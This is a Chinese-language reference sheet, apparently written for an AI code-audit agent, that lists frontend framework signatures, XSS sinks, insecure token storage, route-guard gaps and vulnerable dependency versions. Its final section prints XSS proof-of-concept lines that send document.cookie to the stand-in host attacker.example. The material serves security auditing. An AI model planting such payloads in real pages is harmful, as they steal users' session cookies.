# Frontend 框架签名

> Agent 在前端专项模式 (mode=frontend-focused) 或后端项目含前端代码时查阅。

## 1. 前端项目识别

| 特征 | 含义 |
|---|---|
| `package.json` 存在 + `vue` / `react` / `@angular/core` / `svelte` 依赖 | 框架项目 |
| `vite.config.*` / `webpack.config.*` / `next.config.*` / `nuxt.config.*` | 构建工具 |
| `src/App.vue` / `src/App.tsx` / `src/app/` | 标准结构 |
| `tsconfig.json` | TypeScript |
| `public/index.html` | 单页应用入口 HTML |
| `dist/` / `build/` | 构建产物（不审计） |

## 2. 框架 → 关键文件 → 入口

### Vue 2

| 维度 | 特征 |
|---|---|
| 入口 | `main.js` 中 `new Vue({...})` + `el: '#app'` |
| 组件 | `*.vue` 单文件组件 |
| 路由 | `vue-router` 配置 `routes: [{ path, component }]` |
| 状态 | `vuex` `store` |
| 模板插值 | `{{ userInput }}` 默认转义；`v-html="userInput"` 不转义 |
| 编译产物 | `dist/*.js`（不审计） |

### Vue 3

| 维度 | 特征 |
|---|---|
| 入口 | `main.js` / `main.ts` 中 `createApp(App).mount('#app')` |
| 组件 | `*.vue` (Composition API 或 Options API) |
| 路由 | `vue-router@4` `createRouter` + `createWebHistory` |
| 状态 | `pinia` / `vuex@4` |
| 模板插值 | 同 Vue 2（默认转义，`v-html` 不转义） |
| 编译 | Vite 默认 |

### Nuxt

| 维度 | 特征 |
|---|---|
| 入口 | `nuxt.config.ts` + `pages/*` (文件路由) |
| 数据获取 | `asyncData` / `useFetch` / `useAsyncData` |
| 危险 | SSR 时序问题；用户输入未净化直接渲染 |

### React

| 维度 | 特征 |
|---|---|
| 入口 | `index.tsx` / `index.jsx` 中 `ReactDOM.createRoot(...).render(<App/>)` 或 legacy `ReactDOM.render(...)` |
| 组件 | `*.tsx` / `*.jsx` |
| 路由 | `react-router-dom` `createBrowserRouter` 或 `<BrowserRouter>` |
| 状态 | `redux` / `mobx` / `zustand` / `recoil` / `jotai` |
| 危险 | `dangerouslySetInnerHTML` / `href={userInput}` (javascript:) / `eval` / `setTimeout(string)` |

### Next.js

| 维度 | 特征 |
|---|---|
| 入口 | `pages/*.tsx` (pages router) / `app/*.tsx` (app router) |
| 数据获取 | `getServerSideProps` / `getStaticProps` / `getServerSideProps` (SSR) |
| API | `pages/api/*.ts` (内置 API) |
| 危险 | `getServerSideProps` 中 SQL 拼接 / 用户输入未转义渲染 / `getStaticProps` 注入 |

### Gatsby

| 维度 | 特征 |
|---|---|
| 入口 | `gatsby-config.js` + `src/pages/*` |
| 数据 | GraphQL `gatsby-source-*` |
| 危险 | gatsby-source-filesystem 路径遍历；createPage 用户输入未过滤 |

### Angular

| 维度 | 特征 |
|---|---|
| 入口 | `main.ts` 中 `platformBrowserDynamic().bootstrapModule(AppModule)` |
| 路由 | `AppRoutingModule` + `RouterModule.forRoot(routes)` |
| 组件 | `*.component.ts` + `*.component.html` |
| 模板 | 默认转义；`[innerHTML]` 仍转义除非 bypass |
| 危险 | `bypassSecurityTrustHtml` / `bypassSecurityTrustScript` / `bypassSecurityTrustUrl` / `bypassSecurityTrustResourceUrl` |

### Svelte / SvelteKit

| 维度 | 特征 |
|---|---|
| 入口 | `main.js` 中 `new App({ target: ... })` |
| 组件 | `*.svelte` |
| 路由 | SvelteKit: `src/routes/*` 文件系统路由 |
| 危险 | `{@html userInput}` (类似 v-html) |

### Electron

| 维度 | 特征 |
|---|---|
| 入口 | `main.js` / `main.ts` `app.whenReady().then(createWindow)` |
| 渲染进程 | 任意 Web 框架 |
| 危险 | `nodeIntegration: true` + `contextIsolation: false` → 任意网页 JS 调 Node API |
| 危险 | `webSecurity: false` → CORS 失效 / 跨源读取 |
| 危险 | `loadURL(userInput)` → 内部文件协议 RCE |
| 危险 | `preload` 暴露 ipcRenderer.handle 任意 invoke |

### Tauri

| 维度 | 特征 |
|---|---|
| 入口 | `src-tauri/src/main.rs` + `src-tauri/tauri.conf.json` |
| 渲染进程 | Web 框架 |
| 危险 | `tauri::api::shell` 任意命令执行 / CSP 配置缺失 |

## 3. 前端危险模式

### 3.1 XSS 关键 sink

| 框架 | sink 模式 | 风险 |
|---|---|---|
| Vue 2 / 3 | `v-html="..."` | High（直接输出 HTML） |
| React | `dangerouslySetInnerHTML={{__html: ...}}` | High |
| React | `href={userInput}` 且值以 `javascript:` 开头 | High |
| Angular | `[innerHTML]="..."` + `bypassSecurityTrust*` | Critical |
| Svelte | `{@html ...}` | High |
| jQuery | `.html(userInput)` / `.append(userInput)` | High |
| Vanilla | `element.innerHTML = userInput` | High |
| Vanilla | `document.write(userInput)` | High |
| Vanilla | `location.href = userInput` | Open Redirect |
| Vanilla | `setTimeout(string, ms)` / `setInterval(string, ms)` | 代码执行 |
| Vanilla | `eval(userInput)` | 代码执行 |
| Vanilla | `new Function(userInput)()` | 代码执行 |
| Vanilla | `element.setAttribute("on*", userInput)` | XSS（事件处理器注入） |
| Vanilla | `<script>...</script>` 字符串拼接后插入 | DOM-XSS |

### 3.2 不安全存储

| 存储 | 风险 | 应使用 |
|---|---|---|
| `localStorage` 存 token / refreshToken | XSS 即可窃取（持久化） | httpOnly cookie |
| `sessionStorage` 存 token | 同上（仅会话期） | httpOnly cookie |
| `document.cookie` 直接设置 token | 无 httpOnly/Secure | 服务端 set-cookie |
| IndexedDB 存 PII | 同源页面可读 | 后端 + 短期 token |
| localStorage 存 PII 长期 | 数据泄露 | 短期内存 + 后端 |

### 3.3 路由守卫绕过

```js
// React Router v6
{
  path: "/admin",
  element: <Admin />,
  loader: () => checkAuth()       // 注意：loader 失败应 redirect
}

// 危险：未做失败重定向
{
  path: "/admin",
  element: <Admin />              // 无任何守卫
}
```

```js
// Vue Router
{
  path: '/admin',
  component: Admin,
  meta: { requiresAuth: true }
}

// 守卫缺失或仅前端校验
router.beforeEach((to, from, next) => {
  if (to.meta.requiresAuth && !localStorage.getItem('token')) {
    next('/login')
  } else {
    next()  // 仅前端校验，后端必须二次校验
  }
})
```

### 3.4 状态管理 XSS

```js
// Redux
const initialState = { bio: "" };
// 后端返回 bio 字段未净化 → store → dangerouslySetInnerHTML → XSS
```

```js
// Vuex
state.bio = response.data.bio
// 同样风险
```

### 3.5 fetch / axios 安全

```js
fetch(url, { credentials: "include" })  // CSRF 风险（CORS 配置错误时）
axios.get(url)                            // 默认不携带 cookie，CSRF 风险降低
axios.post(url, data)                     // CSRF：服务端必须校验 token / origin / referer
```

### 3.6 构建产物检查

Agent 不应审计 `dist/` / `build/`，但**应该**：
- 读 `vite.config.*` / `webpack.config.*` / `package.json` 的 `build` 脚本
- 检查 `sourcemap: true` 生产环境（暴露源码）
- 检查是否启用 `terser` 之外的 `eval` / `Function` 保留

## 4. 前端资产清单格式

```json
{
  "id": "AST-0001",
  "type": "component",
  "language": "typescript",
  "framework": "react",
  "path": "src/pages/UserProfile.tsx",
  "component": "UserProfile",
  "route": "/user/:id",
  "uses_dangerous_sink": ["dangerouslySetInnerHTML"],
  "uses_external_input": ["useParams", "fetch"],
  "auth_required": true,
  "tags": ["user-data", "pii"]
}
```

## 5. 危险的前端依赖（同 pentestskill）

- `dompurify < 3.0.6` → XSS bypass
- `marked < 4.0.10` → XSS
- `jquery < 3.5.0` → XSS（老版）
- `ejs < 3.1.10` → RCE in template compilation
- `pug < 3.0.3` → SSTI

## 6. 前端 PoC 形态

XSS PoC 不应是 alert 弹窗（现代浏览器会拦），而是：

```js
// 验证脚本加载
fetch('https://attacker.example/x?c=' + document.cookie)

// DOM-based
location='https://attacker.example/x?'+document.cookie

// 存储型：构造 payload 上传，后台审核
```

但 PoC 仅以**文本形式**输出到报告中，Agent 不直接执行。
